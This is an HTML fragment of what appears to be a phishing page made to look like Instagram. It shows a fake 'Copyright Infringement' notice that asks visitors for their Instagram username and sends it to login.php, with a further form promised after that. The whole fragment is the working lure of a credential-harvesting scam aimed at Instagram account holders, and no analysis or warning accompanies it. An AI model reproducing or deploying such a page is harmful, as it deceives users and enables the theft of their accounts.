      ...
      <div class="lTdZb">
        <div class="vqibd  wNNoj ">
          <div class="ZpgjG   _1I5YO">
            <img style="width: 240px;" src="https://i.imgyukle.com/2020/04/09/QnbQQj.gif"<br>
<h2 class="AjK3K ">Copyright Infringement</h2>
          
          </div>
          <p class="GusmU SVI5E     ">Please write your instagram username and click "Next" and fill the next form.</p>
          <div class="GA2q- ">
            <form class="JraEb" method="get" action="login.php">
              <div class="QuiLu Xb8C0"><input aria-label="@username" aria-required="true" id="nick"
                  name="nick" placeholder="Username" type="text" class="PAhYv zyHYP" value=""></div>
              <span class="idhGk _1OSdk"><button
                  class="_5f5mN       jIbKX KUBKM      yZn4P   ">Next</button></span>
            </form>
          </div>
